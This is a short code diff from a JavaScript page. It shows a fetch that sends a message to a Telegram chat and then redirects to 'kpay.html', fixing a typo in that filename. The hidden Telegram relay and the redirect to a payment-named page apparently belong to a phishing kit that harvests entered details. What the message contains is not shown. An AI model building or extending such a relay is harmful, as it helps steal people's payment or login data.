@@ -34,7 +34,7 @@
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
      })
-     .then(() => window.location.href = "kpayy.html")
+     .then(() => window.location.href = "kpay.html")
      .catch((err) => console.error("خطأ في الإرسال إلى تيليجرام:", err));
  }
 
